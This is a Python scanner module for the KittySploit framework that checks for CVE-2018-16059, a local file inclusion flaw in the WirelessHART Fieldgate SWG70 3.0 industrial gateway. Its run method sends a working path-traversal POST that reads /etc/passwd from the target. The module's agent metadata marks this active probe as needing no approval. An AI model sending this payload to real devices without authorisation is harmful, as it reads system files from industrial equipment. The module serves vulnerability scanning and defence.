#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WirelessHART Fieldgate SWG70 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WirelessHART Fieldgate SWG70 3.0 - Local File Inclusion Detection',
        'description': 'WirelessHART Fieldgate SWG70 3.0 is vulnerable to local file inclusion via the fcgi-bin/wgsetcgi filename parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'iot', 'lfi', 'edb', 'endress', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/45342',
            'https://ics-cert.us-cert.gov/advisories/ICSA-19-073-03',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-16059',
            'https://www.exploit-db.com/exploits/45342/',
            'https://cert.vde.com/en-us/advisories/vde-2019-002',
        ],
        'cve': 'CVE-2018-16059',
    }

    def run(self):
        path = '/fcgi-bin/wgsetcgi'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='action=ajax&command=4&filename=../../../../../../../../../../etc/passwd&origin=cw.Communication.File.Read&transaction=fileCommand')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(
                severity='medium',
                reason='WirelessHART Fieldgate SWG70 3.0 - Local File Inclusion detected',
                path=path,
            )
            return True
        return False

